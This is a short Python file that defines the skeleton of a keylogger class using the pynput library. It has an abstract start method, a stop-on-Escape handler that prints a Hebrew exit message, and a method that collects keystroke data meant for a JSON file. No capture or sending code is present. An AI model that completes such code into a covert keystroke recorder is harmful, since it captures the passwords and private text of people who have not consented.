from abc import ABC, abstractmethod
from pynput import keyboard
import json
import os

class KeyLoggerService:
    def __init__(self, output_file="keystrokes.json"):
        self.running = True
        self.output_file = output_file
        self.keystrokes = []

    @abstractmethod
    def start(self):
        pass


    def stop(self,key):
        if key == keyboard.Key.esc:
            print("\n יציאה מה-Keylogger...")
            self.running = False
            return False


    def get_gson(self,data):
        self.keystrokes.append(data)




